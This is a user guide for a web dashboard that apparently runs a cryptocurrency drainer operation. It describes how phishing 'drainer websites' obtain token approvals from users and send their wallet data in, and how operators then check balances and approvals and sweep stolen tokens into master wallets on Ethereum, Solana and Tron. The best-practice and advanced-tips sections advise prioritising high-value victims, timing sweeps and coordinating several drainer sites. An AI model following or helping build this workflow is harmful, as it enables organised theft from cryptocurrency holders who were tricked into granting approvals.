# Emergency Withdrawal System Dashboard - Complete User Guide

## Table of Contents
1. [System Overview](#system-overview)
2. [Architecture & Security](#architecture--security)
3. [Getting Started](#getting-started)
4. [Dashboard Overview - Token Management](#dashboard-overview---token-management)
5. [Wallet Data Tab](#wallet-data-tab)
6. [Execution Tab](#execution-tab)
7. [Manual Control Tab](#manual-control-tab)
8. [Team Management](#team-management)
9. [API Token Management](#api-token-management)
10. [Best Practices](#best-practices)
11. [Troubleshooting](#troubleshooting)

---

## System Overview

The Emergency Withdrawal System Dashboard is a secure, multi-chain token extraction platform built with Next.js, TypeScript, and PostgreSQL. It manages token withdrawals from wallets that have granted approval to a master wallet through external drainer websites.

### How It Works
1. **External drainer websites** obtain token approvals from users
2. **API Integration** - Drainer sites send wallet data to dashboard via secured API
3. **Dashboard Processing** - Admins review, filter, and execute token extractions
4. **Multi-Chain Support** - Ethereum (ERC20), Solana (SPL Delegation), Tron (TRC20)

### Supported Blockchains
- **Ethereum** - Using ERC20 contract for batch transfers
- **Solana** - Using SPL token delegation system
- **Tron** - Using TRC20 allowance mechanism

---

## Architecture & Security

### Technology Stack
- **Frontend**: Next.js 14 with TypeScript
- **Backend**: Next.js API Routes
- **Database**: PostgreSQL with Prisma ORM
- **Authentication**: NextAuth with magic link emails
- **State Management**: Server-side with real-time updates

### Security Layers
1. **Authentication Layer**
   - Email-based magic link authentication
   - Role-based access (Admin/Viewer)
   - Session management with JWT tokens

2. **API Security**
   - Bearer token authentication required
   - Time-limited API tokens
   - Service-specific token assignment

3. **Execution Security**
   - Admin wallet requirement for transfers
   - On-chain approval verification
   - Balance validation before execution

---

## Getting Started

### Authentication Process

1. **Request Access**
   - You must be added as either Admin or Viewer by an existing admin
   - Contact your administrator to add your email

2. **Magic Link Login**
   - Navigate to the dashboard URL
   - Click **"Sign in with Email"**
   - Enter your authorized email address
   - Check your email for the magic link
   - Click the link to automatically log in
   - Session remains active for secure browsing

### User Roles
- **Admin**: Full access - view, add, delete, execute transfers
- **Viewer**: Read-only access - can only view data

### Required Wallet Extensions
Before executing transfers, install the appropriate wallet:
- **Ethereum**: MetaMask
- **Solana**: Phantom or Solflare
- **Tron**: TronLink

---

## Dashboard Overview - Token Management

The main dashboard is where you manage allowed tokens across all chains.

### Adding Tokens
1. Navigate to **Overview** page
2. Click **"Add Token"**
3. Enter token details:
   - **Token Address** - Contract address (e.g., USDT, USDC)
   - **Token Symbol** - Display symbol
   - **Token Name** - Full name
   - **Decimals** - Token decimal places
   - **Chain** - Select Ethereum/Solana/Tron
4. Click **"Add Token"**

### Managing Tokens
- **View** all added tokens across chains
- **Enable/Disable** tokens using toggle switches
- **Delete** tokens no longer needed
- Only enabled tokens will be processed in withdrawals

### Important Notes
- You must add USDT, USDC, or other tokens before they appear in chain-specific tabs
- Tokens are chain-specific (Ethereum USDT ≠ Tron USDT)
- Disabled tokens remain in system but won't be processed

---

## Wallet Data Tab

This is the primary data management interface showing all wallets that have approved tokens through your drainer websites.

### How Data Arrives
1. User approves tokens on your drainer website
2. Drainer site calls dashboard API with wallet details
3. Data appears in appropriate chain's Wallet Data tab
4. Each chain only shows its respective wallets

### Table Header Controls

#### First Row - Action Buttons
- **Refresh** 🔄 - Manually refresh table data
- **Delete All** 🗑️ - Remove all records (use with caution!)
- **Search Trigger** 🔍 - Execute search based on filters
- **Clear Filters** ✖️ - Reset all filter inputs

#### Second Row - Filter Inputs
- **Wallet Address** - Search specific wallet
- **Min Balance** - Minimum token balance
- **Max Balance** - Maximum token balance  
- **Start Date** - Records created after this date
- **End Date** - Records created before this date
- **Status** - Filter by New/Pending/Executed

### Table Columns
- **Checkbox** - Select records for bulk actions
- **Wallet Address** - User's wallet that gave approval
- **Token Address** - Specific token approved
- **Balance** - Current token balance (0 when first added)
- **Approval Status** - Whether approval is still valid (false when added)
- **Status** - Current processing status:
  - **New** - Just received from drainer
  - **Pending** - Marked for execution
  - **Executed** - Successfully extracted
- **Created At** - When record was first added
- **Actions** - Delete individual record

### Table Footer Actions

When you select records, three options appear:

1. **Update Balances**
   - Queries blockchain for current token balances
   - Updates the balance column with real amounts
   - Essential before processing

2. **Check Approvals**
   - Verifies if wallet's approval is still active
   - Updates approval status to true/false
   - Critical for avoiding failed transactions
   - Checks against master wallets configured in environment:
     - **Ethereum**: `NEXT_PUBLIC_ETH_MASTER_WALLET`
     - **Solana**: `NEXT_PUBLIC_SOLANA_DELEGATE_WALLET`
     - **Tron**: `NEXT_PUBLIC_TRON_MASTER_WALLET`

3. **Process**
   - Marks selected records as "Pending"
   - Only works if:
     - Balance > 10 tokens
     - Approval = true
   - Moves records to Execution tab

### Filtering Workflow Example
To find high-value wallets:
1. Set Min Balance: 1000
2. Set Max Balance: 5000
3. Set Status: New
4. Click Search Trigger
5. Select desired wallets
6. Update Balances → Check Approvals → Process

---

## Execution Tab

This tab shows only records marked as "Pending" and ready for token extraction.

### Interface Overview
- Simplified view without filters
- Shows only pending status records
- Similar table structure to Wallet Data

### Header Controls
- **Refresh** - Update table data
- **Revert All** - Change all pending back to new status
- **Update Balance** - Appears when records selected

### Execution Process

1. **Review Pending Records**
   - Verify wallet addresses
   - Check token balances
   - Ensure all looks correct

2. **Select Records**
   - Use checkboxes to select wallets
   - Can select multiple for batch execution

3. **Execute Tokens**
   - Click **"Execute Tokens"** button
   - Enter receiver wallet address (where funds go)
   - Double-check the address!

4. **Wallet Confirmation**
   - Your admin wallet extension opens
   - Review transaction details
   - Approve the transaction
   - **IMPORTANT**: Must use admin wallet or execution fails!

5. **Monitor Status**
   - Status updates to "Executed" on success
   - Transaction hash appears for verification
   - Failed transactions show error messages

### Security Requirements
- Only admin role can execute
- Must use designated admin wallet
- Each chain has specific master wallet configured in environment:
  - **Ethereum**: Executes from wallet in `NEXT_PUBLIC_ETH_MASTER_WALLET`
  - **Solana**: Uses delegate wallet in `NEXT_PUBLIC_SOLANA_DELEGATE_WALLET`
  - **Tron**: Uses master wallet in `NEXT_PUBLIC_TRON_MASTER_WALLET`

---

## Manual Control Tab

Emergency direct transfer interface for immediate extractions.

### When to Use
- Execution tab not working properly
- Urgent single transfers needed
- Testing with specific amounts
- Bypassing normal workflow

### Input Fields
1. **From Wallet** - Source wallet (must have active approval)
2. **To Wallet** - Destination for funds
3. **Token Address** - Token to extract
4. **Amount** - Quantity to transfer

### Execution Steps
1. Fill all fields carefully
2. Click **"Execute Transfer"**
3. Approve in admin wallet
4. Monitor for completion

### Important Warnings
- Incorrect amounts show high gas fees
- Failed transfers lose gas fees
- Always verify approval exists
- Double-check all addresses

---

## Team Management

Accessible only to Admin users for managing dashboard access.

### Adding Team Members
1. Navigate to **Teams** section
2. Click **"Add New Member"**
3. Enter details:
   - **Email** - Member's email address
   - **Role** - Select Admin or Viewer
4. Click **"Add Member"**

### User Roles Explained
- **Admin**
  - Full dashboard access
  - Can execute transfers
  - Manage team members
  - Generate API tokens
  
- **Viewer**
  - Read-only access
  - Cannot execute transfers
  - Cannot modify data
  - Useful for monitoring

### Managing Members
- View all team members and roles
- Delete members no longer needed
- Only admins can modify team

---

## API Token Management

Critical security component for drainer website integration.

### Understanding API Tokens
- Required for drainer sites to send data
- No token = no data insertion
- Bearer tokens for Authorization header
- Time-limited for security

### Creating New Tokens
1. Go to **API Tokens** section
2. Click **"Generate New Token"**
3. Fill in details:
   - **Service Name** - Website using this token
   - **Duration** - Default 1 day (customizable)
   - **Description** - Optional notes
4. Click **"Generate"**
5. **IMPORTANT**: Copy token immediately - only shown once!

### Token Security
- Each token is unique
- Cannot view tokens after creation
- Tokens expire based on duration
- Delete compromised tokens immediately

### Integration Format
```
Authorization: Bearer YOUR_TOKEN_HERE
```

### Managing Tokens
- View all active tokens
- See service assignments
- Check expiration times
- Delete unused tokens

---

## Best Practices

### Daily Operations
1. **Start each session** by updating balances and checking approvals
2. **Filter systematically** - use balance ranges to prioritize high-value extractions
3. **Batch similar operations** - process multiple wallets together
4. **Verify before executing** - double-check receiver addresses

### Security Guidelines
1. **Protect API tokens** - never share or expose them
2. **Limit admin access** - only trusted team members
3. **Regular token rotation** - delete old API tokens
4. **Monitor viewer accounts** - remove unnecessary access

### Performance Tips
1. **Use filters effectively** - reduce data load
2. **Process in batches** - more efficient than individual transfers
3. **Regular maintenance** - delete executed records periodically
4. **Update selectively** - only check balances for records you'll process

### Record Management
1. **Archive executed records** - export before deleting
2. **Clean up failures** - investigate and remove failed attempts
3. **Monitor new entries** - process high-value wallets quickly
4. **Track patterns** - identify best extraction times

---

## Troubleshooting

### Login Issues
**Cannot receive magic link**
- Verify email is authorized by admin
- Check spam/junk folders
- Ensure correct email entered
- Contact admin to verify access

**Magic link expired**
- Links valid for limited time
- Request new link
- Click link immediately

### Data Issues
**No wallets appearing**
- Verify API tokens are active
- Check drainer site integration
- Ensure tokens are added to dashboard
- Confirm correct chain selected

**Balance showing 0**
- Click "Update Balances"
- Wait for blockchain query
- Check network connectivity
- Verify token contract correct

**Approval showing false**
- User may have revoked approval
- Click "Check Approvals"
- Cannot process without approval

### Execution Problems
**"Insufficient allowance" error**
- Approval was revoked
- Wrong admin wallet
- Token contract issue

**High gas fee warning**
- Amount exceeds balance
- Network congestion
- Wrong token decimals

**Transaction failing**
- Insufficient gas in admin wallet
- Token contract paused
- Network issues
- Wrong admin wallet connected

### API Token Issues
**Drainer not sending data**
- Token expired
- Wrong Authorization header
- Token deleted
- Service name mismatch

**Cannot generate token**
- Must have admin role
- Database connection issue
- Contact system admin

### Performance Issues
**Dashboard loading slowly**
- Too many records displayed
- Use filters to reduce data
- Clear browser cache
- Check internet connection

**Bulk operations failing**
- Too many records selected
- Process in smaller batches
- Check gas limits
- Verify all have approval

---

## Advanced Tips

### Optimizing Extractions
1. **Peak times** - Monitor when high-value approvals arrive
2. **Gas optimization** - Batch during low-fee periods
3. **Priority targeting** - Filter and process highest values first
4. **Regular sweeps** - Don't let approved wallets accumulate

### Multi-Instance Deployment
- Deploy separate dashboards for different operations
- Use unique API tokens per drainer site
- Centralize high-value extractions
- Distribute load across instances

### Environment Configuration
Master wallets must be configured in environment variables:
- **Ethereum**: `NEXT_PUBLIC_ETH_MASTER_WALLET`
- **Solana**: `NEXT_PUBLIC_SOLANA_DELEGATE_WALLET`
- **Tron**: `NEXT_PUBLIC_TRON_MASTER_WALLET`

These wallets are used for:
- Checking approvals when "Check Approvals" is clicked
- Executing batch transfers from the dashboard
- Validating permissions before processing

### Integration Best Practices
1. **API Implementation**
   - Implement retry logic
   - Log failed submissions
   - Monitor token expiration
   - Use HTTPS only

2. **Drainer Coordination**
   - Immediate API calls after approval
   - Include all required data
   - Handle API failures gracefully
   - Track submission success

---

*For technical support or system administration, contact your designated administrator.*